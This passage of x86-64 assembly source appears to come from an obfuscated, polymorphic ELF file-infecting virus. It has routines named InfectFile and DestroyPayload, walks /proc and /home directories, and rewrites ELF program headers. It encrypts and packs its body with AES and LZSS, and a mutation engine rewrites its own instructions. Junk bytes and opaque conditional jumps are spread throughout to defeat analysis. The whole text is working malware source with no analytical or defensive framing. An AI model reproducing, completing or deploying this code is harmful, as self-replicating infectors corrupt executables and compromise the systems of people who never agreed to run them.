..@BMKiu3uDB1So:
    mov         r2, 1b
    push        rdi
    pop         rdi
    jmp         ..@QO8ojDNmXM62
..@g0REn8GOAfUj:
    cmp         BYTE [r1], '/'
    mov         rsp, rsp
    jb          ..@5guWRqwY3vFW
    jae         ..@5guWRqwY3vFW
..@7nhBSp6n8eeI:
    xor         rcx, rcx
    jmp         $+4
db 0x67, 0x97
    jmp         $+5
db 0xff, 0x4c, 0x1b
    jl          ..@lD9lfum5EyOL
    jge         ..@lD9lfum5EyOL
..@IauXyyUkTlfg:
    add         rsp, _INFDIR_OFF_size
    jmp         ..@j1OlAjGQIBxG
..@b1BpVuiB3GVf:
    xor         rdi, rdi
    jmp         ..@RW5cdZeRv0Pl
..@1EF2J7pYSpND:
    xchg        rdi, rdi
    jmp         $+3
db 0x44
    jb          ..@uXkQCGQfVkmO
    jae         ..@uXkQCGQfVkmO
..@SSA55P1Q7RjG:
    pop         r5
    mov         rdi, rdi
    jmp         $+3
db 0xc3
    jmp         ..@eJiC9Cy3Aygh
..@p9itXrdCwVnB:
    xchg        rbx, rbx
    jmp         $+4
db 0xba, 0xcd
    jb          ..@ZgOevwOi66bb
    jae         ..@ZgOevwOi66bb
..@fnreVaw0NouQ:
    mov         ecx, edx
    jl          ..@TZI5pPOYOHXX
    jge         ..@TZI5pPOYOHXX
..@aJDbvqO0u4ik:
%ifdef X86_64
    cmp         al, 41h
%endif
    jmp         ..@7GuOi2ab2T0u
..@NEPj27k1kK7l:
%ifdef X86_64
    or          ebx, edx
%endif
    jmp         $+3
db 0xd6
    jmp         $+5
db 0x83, 0x97, 0xb4
    jmp         ..@rLKEwkFkb1r0
..@3bM17ePst04Y:
    push        rax
    pop         rax
    jb          ..@k4DWPbKAffEW
    jae         ..@k4DWPbKAffEW
..@C0yGW2uoTFzi:
%ifndef ENABLE_DEBUGGING
    push        rdi
%endif
    jmp         $+5
db 0x07, 0x2c, 0x47
    je          ..@SkOHJ8NCBgLA
    jne         ..@SkOHJ8NCBgLA
..@bM7CpfVo6AJ0:
    syscall
    jmp         $+5
db 0x82, 0x99, 0x6b
    jmp         $+3
db 0x04
    jmp         $+3
db 0x7a
    js          ..@XY2wapTSRFpv
    jns         ..@XY2wapTSRFpv
..@XNOmR0xuBk3G:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jmp         $+3
db 0x6e
    js          ..@SCHpYh034MqT
    jns         ..@SCHpYh034MqT
..@jsqt50ZBtoXM:
%ifdef X86_32
    and         esi, 0000ffffh
%endif
    je          ..@FZJjh9kn4e8x
    jne         ..@FZJjh9kn4e8x
..@tHW9iU2ffxyY:
    jne         ..@8XTGYnBT6iil
    jl          ..@e2LxLhzBmsGn
    jge         ..@e2LxLhzBmsGn
..@1vPus577oa21:
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    jmp         $+3
db 0xdd
    js          ..@L4Ud7TM1Vvoy
    jns         ..@L4Ud7TM1Vvoy
..@f6efuwFxoplr:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jl          ..@j0bkbqsEvUun
    jge         ..@j0bkbqsEvUun
..@v7wrTsBgK4Os:
    cmp         rax, 0xffffffffffffffff
    jmp         $+3
db 0xce
    jmp         ..@5n5FUxhty43X
..@V23Bwdjln4BJ:
    add         rsp, _UPDATASIG_OFF_size
    pop         r5
    pop         r4
    jmp         $+4
db 0x97, 0x93
    jmp         ..@BHj4UrFzrI9l
..@bqYOwT8egvtk:
    cmp         dl, 68h
    je          ..@cle90Kde6jzn
    jmp         $+3
db 0x57
    jmp         $+5
db 0x59, 0x2d, 0x2b
    jmp         $+3
db 0xed
    js          ..@BZnoijiJZFhT
    jns         ..@BZnoijiJZFhT
..@7a9cFLB1DYRk:
    jne         ..@oRqBQCUG7ZZe
    js          ..@D4puhv4aPdvZ
    jns         ..@D4puhv4aPdvZ
..@tXkh6qt8Ddiz:
    mov         rax, r4
    jmp         $+3
db 0x01
    jmp         $+5
db 0xf3, 0x60, 0xdc
    jb          ..@pxPyVvlMQW1U
    jae         ..@pxPyVvlMQW1U
..@RyNUexJUqHmS:
    mov         bl, dl
    and         bl, 111b
    jmp         $+4
db 0xba, 0xbc
    jmp         ..@XndGscxJaKlF
..@AZjoR2Koq0cR:
    push        rcx
    jmp         $+5
db 0x34, 0x31, 0x1b
    jmp         ..@AX1dUrixaByA
..@9h7HflwnAPGA:
    pop         rax
    js          ..@Pbaq65NybHxY
    jns         ..@Pbaq65NybHxY
..@7ABgPtLkKRyR:
    cmp         eax, 0x0
    jle         ..@zUSU96Pfv1Xo
    mov         QWORD [r5+file.filesize], rax
    jmp         $+3
db 0x8f
    jmp         $+4
db 0x6a, 0xc1
    jb          ..@AHrZzQ5jPpOh
    jae         ..@AHrZzQ5jPpOh
..@f0s3Ok834EYm:
    xor         rbx, rbx
    jmp         $+5
db 0x38, 0xcf, 0x30
    jl          ..@p9itXrdCwVnB
    jge         ..@p9itXrdCwVnB
..@TUMKCIW5l5SJ:
    or          bx, ax
    jmp         $+4
db 0x6c, 0x19
    jl          ..@FiF583wZ9llx
    jge         ..@FiF583wZ9llx
..@axyPFnBunc6Z:
    cmp         BYTE [r1+5], '/'
    mov         rdx, rdx
    jmp         $+5
db 0x68, 0x08, 0x41
    jl          ..@iMxtzQa24SYU
    jge         ..@iMxtzQa24SYU
..@wAI0XsYvfx5f:
    and         edx, 000f000f0h
    jmp         $+5
db 0x33, 0xbc, 0xa0
    jmp         ..@a5z1SJPPTfNy
..@2lL5OpbUZa3m:
    sub         r2, non_encrypted_len
    jmp         $+3
db 0x56
    jmp         $+3
db 0x78
    jmp         ..@dFHBM9zlkCcA
..@5guWRqwY3vFW:
    jne         ..@jAAW6sOMU7Ms
    cmp         DWORD [r1+1], "home"
    jne         ..@jAAW6sOMU7Ms
    jmp         $+5
db 0x23, 0x9a, 0x8b
    jmp         $+4
db 0xc2, 0x88
    jl          ..@axyPFnBunc6Z
    jge         ..@axyPFnBunc6Z
..@qVSrfKtsPMiP:
    call        ConvertPushPopToMove
    jl          ..@PNvA7DNCMUcm
    jge         ..@PNvA7DNCMUcm
..@YOhfNFuiu2CC:
    jmp         ..@wqDdvyhDcTQG
    je          ..@CqKVdWh1UuSw
    jne         ..@CqKVdWh1UuSw
..@NR6F8jJSRiZW:
    mov         rbx, rbx
    jmp         $+3
db 0xd0
    jmp         ..@mylfKm3gbVv2
..@5iwlMSeoBz9c:
%ifdef X86_32
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
    mov         rbp, rbp
%endif
    jmp         ..@GoLKN333aX1K
..@suwTOlaTXgs6:
    mov         rcx, rcx
    shl         ecx, 8
    xchg        rsi, rsi
    jmp         $+5
db 0xd1, 0xc2, 0x4b
    jl          ..@fh5BmBWEdP6K
    jge         ..@fh5BmBWEdP6K
..@dxSQiOQ8yfbu:
    rep         movsd
    jb          ..@CvsCR6xL0F5j
    jae         ..@CvsCR6xL0F5j
AddSizeMappedFile:
    jmp         ..@bwdRKhG1d853
..@mQwxqD5Fmg3s:
    cmp         r3, 0x00
    js          ..@lRoNgltbvzT1
    jns         ..@lRoNgltbvzT1
..@1pSmmejY1bfp:
    xor         rcx, rcx
    jmp         ..@76hkp3XCJU7B
..@xQhcMauL173n:
    cmp         dl, 2dh
    jb          ..@F8mKZewFkzfF
    jae         ..@F8mKZewFkzfF
..@TxyvKXBIQfy2:
    add         rsp, _NBF_OFF_size
    ret
    jl          ..@H1BdCHpeEnXW
    jge         ..@H1BdCHpeEnXW
..@RhoNJikEvJok:
    sub         rsp, 0x100
    push        0x00
    jmp         ..@bHAjlu5jN9ee
..@c0fKarYDzBsY:
    pop         rdi
    je          ..@EvPA0VDnkpF9
    jne         ..@EvPA0VDnkpF9
..@0HfEvhxqpcDP:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         $+5
db 0x60, 0x86, 0xe3
    js          ..@2ZsVGzlyFXu6
    jns         ..@2ZsVGzlyFXu6
..@ACZZbcpK8UxC:
    pop         rdx
    xor         rbx, rbx
    jmp         $+5
db 0xf3, 0x70, 0xcd
    jmp         ..@sRySGcaUo07N
..@Gc8Jp8YLOcyj:
    push        rax
    pop         rax
    jmp         $+3
db 0x25
    jmp         ..@8V7OeZ0OqnBp
..@6EuOFe9LMx0y:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jl          ..@LlNUVQiJMpXB
    jmp         ..@m1LKjwfn8ZBL
..@N5wHDuh5SyNX:
    xchg        rcx, rcx
    add         BYTE [rdi], 2
    jmp         $+3
db 0x85
    jmp         ..@OKvWNxol0i0B
..@60SKbBqog7Re:
    pop         rdi
    jmp         DestroyPayload
..@nB3x1vdD7cYf:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         eax, SYS_DUP2
    syscall
%endif
    jb          ..@XKPavLuhXxcW
    jae         ..@XKPavLuhXxcW
..@eJiC9Cy3Aygh:
    ret
    jmp         $+3
db 0x86
    js          MemMove
    jns         MemMove
..@ua9hBN6DwwgB:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    js          ..@uR79w1EnAnvb
    jns         ..@uR79w1EnAnvb
..@lew1IKercMrr:
%ifdef X86_32
    push        rbx
    pop         rbx
%endif
    jb          ..@TNFZRdVIcw8n
    jae         ..@TNFZRdVIcw8n
..@oqU2FP1WOteU:
%ifdef X86_64
    test        al, al
    jz          ..@7r1Kqjwq0Pgy
%endif
    jmp         ..@vHeyPyZtrjTt
..@55MRkZuLVVln:
    xor         r4, r4
    jmp         $+5
db 0xe2, 0x16, 0x0b
    jb          ..@A1mm8rpGUwKG
    jae         ..@A1mm8rpGUwKG
..@GZaXgyoGcP6X:
    xchg        rcx, rcx
    jb          ..@pb4PdKEHxbd0
    jae         ..@pb4PdKEHxbd0
..@wlN4IDhquRgr:
    mov         r2, QWORD [r1+file.filename]
    jmp         $+3
db 0xa8
    jmp         ..@8CLPWn9dYk77
..@jBPVf0lNRLx6:
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jb          ..@D8kyaPS5AtuE
    jae         ..@D8kyaPS5AtuE
..@J3h23JgIfuLY:
    push        rcx
    jmp         $+3
db 0x26
    jl          ..@MqgqbCvZVyq4
    jge         ..@MqgqbCvZVyq4
..@o9oH3NiVX2Fg:
    xor         r3, r3
    jmp         $+5
db 0xf3, 0x71, 0xdb
    js          ..@YFSwuBtTfvsG
    jns         ..@YFSwuBtTfvsG
..@ZQ2ktwaqdODN:
    call        WORDToDWORDASCII
    js          ..@6q3Z5MUY2To1
    jns         ..@6q3Z5MUY2To1
..@EZKcSdHgIyMC:
    jmp         ..@BxYkwVEfujhX
    jmp         $+3
db 0x3e
    jmp         ..@FjzCtjpiGDrH
..@VyXsI30d1mMs:
    mov         dl, BYTE [rsp+bytes+2]
    xor         dl, BYTE [rsp]
    and         dl, 1110b
    jl          ..@Uve1D81fvBW9
    jge         ..@Uve1D81fvBW9
..@Vdr2IJNEIv8T:
%ifndef ENABLE_DEBUGGING
    mov         r1d, 0x2
%endif
    jmp         $+5
db 0x5a, 0xfc, 0x32
    jmp         $+5
db 0x4f, 0xa6, 0x5a
    jb          ..@HQLDFDliqbk6
    jae         ..@HQLDFDliqbk6
..@ouorjOD8AGZy:
    pop         rcx
    jb          ..@AN1ysWueQiV8
    jae         ..@AN1ysWueQiV8
..@0o2oM4nf8HGD:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    xchg        rbx, rbx
    js          ..@xLi1GPvGBv2V
    jns         ..@xLi1GPvGBv2V
..@SCKk9X2mOglx:
    push        rdx
    pop         rdx
    jmp         $+5
db 0x44, 0x48, 0x7e
    js          ..@bU2QdPfZw1D0
    jns         ..@bU2QdPfZw1D0
..@PPVw3N0i35rn:
    or          edx, ecx
    mov         rcx, rcx
    jmp         ..@GN2rl6AZYgY0
..@5n2ABk4YcTal:
%ifdef X86_64
    jz          ..@75ohYMSoAkrM
    mov         WORD [rdi], bx
    add         rdi, 2
%endif
    jmp         $+5
db 0xb4, 0xc2, 0xff
    jb          ..@IoJ5CqNBCX21
    jae         ..@IoJ5CqNBCX21
..@rnNgXCFNEP3x:
    jmp         ..@CgJqUux0xpqb
    jl          ..@oXHvF2Fg7pSY
    jge         ..@oXHvF2Fg7pSY
..@G1dcIDUbk9NS:
%ifndef ENABLE_DEBUGGING
    xchg        rdx, rdx
    xchg        rsp, rsp
%endif
    jmp         $+5
db 0x87, 0x3a, 0x03
    js          ..@kne6b6kXtZaM
    jns         ..@kne6b6kXtZaM
..@l3AhRwXuumTB:
    mov         rdx, rdx
    call        MemMove
    jmp         $+3
db 0xaa
    js          ..@M5BzQE6qGmdQ
    jns         ..@M5BzQE6qGmdQ
..@mylfKm3gbVv2:
    mov         r3d, 0x02
    mov         eax, SYS_LSEEK
    syscall
    jmp         $+3
db 0x3f
    jmp         ..@7ABgPtLkKRyR
..@a5z1SJPPTfNy:
    cmp         edx, 00700070h
    je          ..@CqKVdWh1UuSw
    jmp         ..@oRqBQCUG7ZZe
    jmp         $+4
db 0x2b, 0x72
    jmp         $+5
db 0xfa, 0xf6, 0xcb
    je          ..@WutBrwoVWeEb
    jne         ..@WutBrwoVWeEb
..@gOaJxBC02Lpu:
    jg          ..@b4Q6YQEBTlxQ
    jmp         $+3
db 0x4c
    jmp         $+5
db 0x45, 0x76, 0xfc
    jmp         ..@MpOR4bOEknRs
..@OauQEt2hz9ai:
    mov         ax, WORD [r1]
    jmp         $+3
db 0xe8
    jmp         ..@UZIuGzVbwDYV
..@Nq0JdWD4Pmok:
    pop         rsi
    sub         r5, 1
    push        rsi
    jmp         ..@sbHdnZjrEyDy
..@PbDqRhyXGcQF:
    mov         rcx, rcx
    sub         r2, m6
    jmp         ..@2lL5OpbUZa3m
..@9An8hhxGWMoA:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         $+5
db 0x08, 0x31, 0x79
    jmp         $+3
db 0xd8
    jmp         $+4
db 0x70, 0x1e
    jmp         $+3
db 0x81
    jmp         ..@HhOszDPCRbSi
..@fuX3ryKMEWwV:
    mov         BYTE [rdi], 90h
    jb          ..@3leEV3wtDFcw
    jae         ..@3leEV3wtDFcw
..@IWNQHJ1Al0RQ:
    mov         m6, rax
    jb          ..@f1xslDInVtmk
    jae         ..@f1xslDInVtmk
..@bPOAuJA2SJip:
%ifdef X86_32
    xor         ebx, ebx
%endif
    jmp         $+4
db 0x2a, 0x43
    jl          ..@D3ZVTXwbnoBm
    jge         ..@D3ZVTXwbnoBm
..@P4a0N9Mx1prm:
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    push        rsi
    pop         rsi
    jmp         $+3
db 0xd1
    jmp         $+3
db 0xcc
    jl          ..@PnV3owMWayOi
    jge         ..@PnV3owMWayOi
..@PBy5ZKTnAVhm:
    pop         rcx
    jmp         $+5
db 0xf1, 0xeb, 0xd8
    jb          ..@YpjQBlt7KI7n
    jae         ..@YpjQBlt7KI7n
..@8f95lBbHZ92R:
    push        r5
    jmp         $+5
db 0x53, 0x81, 0x48
    js          ..@55MRkZuLVVln
    jns         ..@55MRkZuLVVln
..@A1SFTyeHxq1g:
%ifdef X86_32
    cmp         dl, 05h
%endif
    jmp         $+3
db 0x83
    je          ..@Xsh6lu1Lu8dd
    jne         ..@Xsh6lu1Lu8dd
..@kTKlozcJw23R:
    mov         rsi, QWORD [rsp+_AESE_OFF.startaddr]
    jmp         $+5
db 0x3d, 0x31, 0x77
    jmp         $+4
db 0x07, 0x47
    jmp         $+4
db 0xfe, 0xb7
    jmp         ..@AyyYVigYT09L
..@zxo0MSyfr4Fx:
    xchg        rsi, rsi
    js          ..@NDWcW9tDbkDC
    jns         ..@NDWcW9tDbkDC
..@yZZQCbsTC2SX:
    add         r1, 1
    mov         rcx, rcx
    jmp         $+3
db 0xd1
    jmp         $+3
db 0x5c
    jmp         ..@PWAKomQXpQuU
..@Ht8cjbRbuDUX:
    VAR         packed, urandom
    jmp         $+5
db 0x42, 0x0f, 0x28
    jmp         $+5
db 0x63, 0x64, 0x80
    js          ..@w6zOxe36sGbT
    jns         ..@w6zOxe36sGbT
..@HbdMUBMVVk0Y:
    add         r1, r4
    cmp         BYTE [r1], 0x00
    jmp         $+5
db 0x5d, 0x17, 0x04
    jmp         $+4
db 0x73, 0x5d
    jmp         ..@GJZQ7h7f8iwI
..@gtNkd0fKC3pr:
    push        rax
    pop         rax
    jmp         $+3
db 0x8c
    jmp         $+5
db 0x06, 0x32, 0x6a
    jmp         ..@3YCTu9Z7GH6o
..@0NT0AImZ5Fds:
    jne         ..@BzOmvkU3JGsv
    jmp         $+3
db 0x86
    jmp         $+3
db 0xfb
    jmp         ..@BzOmvkU3JGsv
..@3EFudJRlCvAQ:
    mov         rdi, rdi
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+5
db 0xf3, 0x08, 0x55
    jmp         $+3
db 0x05
    jmp         ..@pq26tOUByPH6
..@GLxx94LTj3sd:
    pop         r4
    jmp         $+3
db 0x70
    jl          ..@cISsTFf4Ut4J
    jge         ..@cISsTFf4Ut4J
..@s896LYvCT0Qq:
    movdqu      xmm1, oWORD [rsp+0xd0]
    js          ..@zPId1Mt7LJIW
    jns         ..@zPId1Mt7LJIW
..@mnM7yZfp6OUp:
    mov         rcx, rcx
    call        Strcpy
    mov         BYTE [r1], 0x00
    jmp         ..@n6phly1eKMU2
..@nLIKB09KFAye:
    xor         rdx, rdx
    jmp         ..@zRI5ZB4p5NKj
..@3qU1T24gIuTC:
%ifdef X86_64
    test        al, al
    jz          ..@0mRtLOgc4pDT
%endif
    jmp         $+5
db 0x1c, 0x3f, 0xb6
    jb          ..@ggVm4Iygtbxp
    jae         ..@ggVm4Iygtbxp
..@ybO2VPsg15lq:
    xor         rdx, rdx
    xor         rax, rax
    push        rcx
    jmp         $+3
db 0xcc
    jl          ..@PBy5ZKTnAVhm
    jge         ..@PBy5ZKTnAVhm
..@uWwzxfGZwwl6:
    push        rax
    jmp         ..@9h7HflwnAPGA
..@csVvmbwje1TL:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    mov         rsi, rdi
    jmp         ..@jebsABC5k7MU
..@2mk6w16RZ7O9:
    mov         rbx, rbx
    je          ..@wpcL4PENomeI
    jne         ..@wpcL4PENomeI
..@kHmm0GQx9xyJ:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    push        rdx
    jmp         $+5
db 0x41, 0x48, 0x5f
    jmp         $+4
db 0xdd, 0xbd
    jmp         ..@Gc8Jp8YLOcyj
..@qv0KdPdnnNdt:
%ifdef X86_64
    and         bx, 111b
%endif
    jl          ..@zKOO1sgTl70j
    jge         ..@zKOO1sgTl70j
..@oLjrzJJxKJjy:
    lea         r1, [rsp+_PROC_OFF.buffer]
    mov         r2, [rsp+_PROC_OFF.dirname]
    call        Strcpy
    jmp         $+4
db 0xfb, 0x04
    jmp         ..@JfiMsq3h9kW8
..@0SPDNW7xaF41:
    mov         rax, QWORD [rsi+rcx+bytes]
    jl          ..@BMgmzENq966g
    jge         ..@BMgmzENq966g
..@xYxGmJi6dLbM:
    mov         rbp, rbp
    jmp         $+5
db 0xc9, 0xcf, 0x42
    jmp         ..@csVvmbwje1TL
..@udrmKAr6gjbz:
    xchg        rcx, rcx
    jmp         $+4
db 0x80, 0x67
    jb          ..@Vb0t7lWVQDiz
    jae         ..@Vb0t7lWVQDiz
..@Q8IZtkK1Mdvg:
    xchg        rsi, rsi
    jmp         $+4
db 0x11, 0xe6
    jmp         ..@S34TTlJCVFzO
..@VXFUrLEkftFr:
    mov         r2, QWORD [r5+file.filesize]
    push        rdi
    jb          ..@8TrT0itfsce3
    jae         ..@8TrT0itfsce3
..@gHIEYCmk273H:
    mov         BYTE [rdi], al
    jmp         $+4
db 0x5c, 0x35
    jmp         $+4
db 0x73, 0x76
    jb          ..@z4oiDa2pQYjj
    jae         ..@z4oiDa2pQYjj
..@VWCOp9xDH6cA:
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    add         r4, rax
    jmp         ..@SCpB55urRvRC
..@Qf45onhWLgOo:
%ifdef X86_64
    test        al, al
%endif
    jb          ..@5f1xWIsECAT3
    jae         ..@5f1xWIsECAT3
..@w7DgBXrNED35:
    je          ..@WH2kS6nsQPcJ
    jb          ..@QKbksaxfm0sz
    jae         ..@QKbksaxfm0sz
..@h5raGvhPRPS9:
    add         r1, QWORD [r2]
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         $+3
db 0xe7
    je          ..@f0s3Ok834EYm
    jne         ..@f0s3Ok834EYm
..@TTVcsW75EvcK:
    mov         rdi, rdi
    jmp         $+5
db 0x4b, 0xd8, 0x02
    jmp         $+3
db 0x47
    jmp         $+4
db 0x7e, 0x33
    jmp         ..@7hDNqIZAb58j
..@9oPClc9GvwdT:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
    xor         r2, r2
    xchg        rbx, rbx
%endif
    jmp         $+4
db 0x35, 0x8c
    js          ..@wbmivYj3L7F6
    jns         ..@wbmivYj3L7F6
..@yvX1ALgr5DzH:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    push        rdi
    jmp         $+3
db 0xb4
    jl          ..@VI3fLWZPGBSe
    jge         ..@VI3fLWZPGBSe
..@rrKTaVmynmQU:
    mov         QWORD [r5+file.filesize], 0x00
    jmp         $+3
db 0xdf
    jmp         ..@MSM5oJdOsF6P
..@oCGmYSVwYlWR:
    xchg        rdx, rdx
    xor         rbx, rbx
    jmp         $+3
db 0x34
    jb          ..@Jd2mr2AfCQPi
    jae         ..@Jd2mr2AfCQPi
..@CA86gJ6boPlR:
    rep         nop
    jmp         $+5
db 0x22, 0x9f, 0x9a
    jmp         ..@BdLOVSGSUV6f
..@WX0MzFP9JUQo:
    add         r1, 1
    add         r2, 1
    jmp         $+4
db 0x00, 0x06
    jb          ..@iAGV4goFgChN
    jae         ..@iAGV4goFgChN
..@u2ZpTyMhWeXB:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    jmp         $+5
db 0x4b, 0x60, 0x16
    jmp         $+4
db 0x16, 0xe5
    jb          ..@1vPus577oa21
    jae         ..@1vPus577oa21
..@JhkRtZSpGDmp:
    pop         r5
    jmp         $+5
db 0x61, 0x0d, 0x3f
    jmp         $+4
db 0xcd, 0x18
    je          ..@GLxx94LTj3sd
    jne         ..@GLxx94LTj3sd
..@B6R2AAnFExe1:
    test        eax, eax
    jnz         ..@BXbNSDPmerc2
    jmp         $+3
db 0x2f
    jl          ..@LTUqOMTWieh9
    jge         ..@LTUqOMTWieh9
..@1uNEt7Y4e7Q4:
    call_vsp    ExitProgram
    jmp         ..@InqweSwsTToA
..@4KbzGHAAiHIc:
    je          ..@AYi5ZrLiyLcF
    xor         r3, r3
    mov         rbp, rbp
    jmp         $+5
db 0x18, 0xda, 0x33
    jl          ..@IWNQHJ1Al0RQ
    jge         ..@IWNQHJ1Al0RQ
..@SGwb4iW12E0I:
    jmp         ..@YaYVHM2IfVM9
    jb          ..@buWmpYFpOQsU
    jae         ..@buWmpYFpOQsU
..@sy86thqMCVoN:
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         ..@aQPWMu7JEWlv
..@6fFNj4HXmtyj:
    push        rsi
    jmp         $+5
db 0xdf, 0xaf, 0x2d
    jmp         ..@Nq0JdWD4Pmok
..@t2tRr5Wqswcf:
%ifdef X86_64
    mov         edx, 48h
%endif
    jmp         $+4
db 0xde, 0xc2
    jb          ..@aJDbvqO0u4ik
    jae         ..@aJDbvqO0u4ik
..@W9lEkh8h5Oaa:
    xchg        rdx, rdx
    mov         r2, QWORD [r5+file.filesize]
    jmp         $+4
db 0x17, 0x08
    jmp         ..@DAK7oDb6AzUa
..@lXhf6NVmcpf8:
    xor         rdx, rdx
    jb          ..@EERfbmOXFiei
    jae         ..@EERfbmOXFiei
..@hsYBBsakIA3P:
    mov         rdi, rsi
    jmp         ..@D8I7702PHlA5
..@hXgjlBOCgSoJ:
    mov         eax, 0x20
    rep         stosb
    jl          ..@1QjvQ8ebtmIL
    jge         ..@1QjvQ8ebtmIL
..@VxxKtJHj7vq5:
    test        rax, rax
    jb          ..@hO1gDhErkHEj
    jae         ..@hO1gDhErkHEj
..@EiLImiAXyma9:
    pop         rbx
    jmp         $+5
db 0x5e, 0x03, 0xb0
    jb          ..@mAMUeLcSRZtq
    jae         ..@mAMUeLcSRZtq
..@cENA9U7jA0VU:
    xchg        rdi, rdi
    jmp         $+3
db 0x27
    jmp         $+5
db 0x57, 0xd3, 0xcb
    js          ..@TCdf6PWlmoHY
    jns         ..@TCdf6PWlmoHY
..@tw6EPzzSee3I:
    movdqu      xmm1, oWORD [rsp+0xc0]
    jmp         $+5
db 0x67, 0x3f, 0xcb
    jmp         $+3
db 0xd8
    jmp         $+3
db 0xcb
    jb          ..@61SCDE2XIodj
    jae         ..@61SCDE2XIodj
..@5WpIo8mMLQLd:
    xor         rax, rax
    xor         rcx, rcx
    xor         rbx, rbx
    js          ..@fhEDJeBM9zcv
    jns         ..@fhEDJeBM9zcv
..@oOAFpBBFbmEs:
    pop         rcx
    pop         rsi
    jmp         $+3
db 0x89
    jmp         $+3
db 0x5a
    jb          ..@llpkKbb9zjOo
    jae         ..@llpkKbb9zjOo
..@iCaT5iaYDp23:
    lea         r3, [rsp+_NBF_OFF.key]
    jmp         $+3
db 0xd1
    jmp         ..@8Fnn80eERUiR
..@tcyebFYfahNp:
    shr         edx, 8
    jmp         ..@vzLWnN1gzzLb
..@qZea3QA1UtAP:
    je          ..@HHaWXFCPNkik
    push        rax
    jmp         $+5
db 0x13, 0xa4, 0x3a
    jb          ..@JhwSxCf14Nro
    jae         ..@JhwSxCf14Nro
..@YpjQBlt7KI7n:
    mov         dx, WORD [rsp] 
    push        rcx
    jmp         ..@fyTf3CTSOSVv
..@4hymSJ9rfGSy:
    push        rax
    push        rcx
    jmp         $+5
db 0xed, 0x04, 0xad
    jmp         ..@rPa2DEUJ56Ps
..@qSb8tbYaNYLO:
    jle         ..@BxYkwVEfujhX
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jb          ..@BxYkwVEfujhX
    jae         ..@BxYkwVEfujhX
..@0n4iIKtBjQtI:
    xor         rax, rax
    jmp         ..@PuEWHSuen8vk
..@uEcbI8Yu0cVn:
    mov         QWORD [rsp+_MUTA_OFF.start], r1
    jmp         $+3
db 0xc5
    jmp         ..@U6lMVIe3RT2f
..@Zmt6FMkWNvAX:
    sub         rsp, _PAYLOAD_OFF_size
    js          ..@Cx9Okgs1Nfhg
    jns         ..@Cx9Okgs1Nfhg
..@DAK7oDb6AzUa:
    mov         rdi, rdi
    mov         rdx, rdx
    js          ..@2m8OSTxzcjDK
    jns         ..@2m8OSTxzcjDK
..@fJwi4KO7awaA:
    call        ConvertPushPopValueToMoveValue
    rep         nop
    jmp         $+4
db 0x3e, 0xdd
    jmp         $+3
db 0xf5
    jb          ..@DQApDIXBnQUn
    jae         ..@DQApDIXBnQUn
..@PsqkbZUMqu1C:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@838IYLJ3xuEs
..@A1mm8rpGUwKG:
    mov         r4d, DWORD [r1 + file.filefd]
    mov         r5, r1
    jmp         $+5
db 0x4f, 0x0c, 0x98
    jl          ..@5vVe2X67bSYL
    jge         ..@5vVe2X67bSYL
..@ziyz88UsLtVP:
    add         rdi, non_packed_len
    jmp         $+5
db 0xac, 0xd7, 0x72
    jmp         $+5
db 0xe8, 0x35, 0x38
    jmp         ..@MTN77MBzayJf
..@CugzcQdcmrGw:
    xchg        rsi, rsi
    add         rsi, rcx
    jmp         $+3
db 0x09
    jl          ..@x2cIzvHIoN7R
    jge         ..@x2cIzvHIoN7R
..@j1OlAjGQIBxG:
    ret
    jmp         InfectFile
..@k9MAwOWPHYxn:
    sub         rsp, _AESE_OFF_size+0x100
    mov         rax, rax
    and         rsp, 0xfffffffffffffff0
    jmp         ..@Sz8jiNulC21h
..@zNN43TdSOtOa:
    mov         r5, [rsp+_NBF_OFF.file]
    jmp         $+3
db 0x3d
    jmp         ..@NbdbrIrlTPYG
..@Wgs0ql0gCjUr:
    mov         rbx, rbx
    push        rdi
    jmp         $+4
db 0xf5, 0xac
    jb          ..@zGv2sW3MMEnx
    jae         ..@zGv2sW3MMEnx
..@Z9ElKfnhyf6L:
    push        rsi
    jmp         $+5
db 0x69, 0x0b, 0x4c
    jmp         ..@jhBEwTGVcUEu
..@GJBVnObZH1mn:
    sub         rsp, _PROC_OFF_size
    VAR         packed, procdir
    jmp         ..@7inhcZIKukmI
..@B2nxPRqBkWLd:
%ifdef X86_64
    and         edx, 0000f8ffh
%endif
    jmp         $+3
db 0x08
    jmp         $+3
db 0xa4
    jmp         ..@TbWPyjEpNWcD
Strcpy:
    jmp         ..@A65JWGkUowQL
..@3YIMPPTq4HDL:
    jnz         ..@1JecwvIGkwH0
    jmp         $+4
db 0x05, 0x7a
    jl          ..@0xZvFLgoaoXL
    jge         ..@0xZvFLgoaoXL
..@uswXa1C0FXXV:
    mov         rax, 0xff
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jl          ..@65vglO7fE3Bp
    jge         ..@65vglO7fE3Bp
..@OyDTU3D8jyHm:
    mov         BYTE [rdi+11], 90h
    jmp         $+4
db 0x85, 0x6d
    jl          ..@YOhfNFuiu2CC
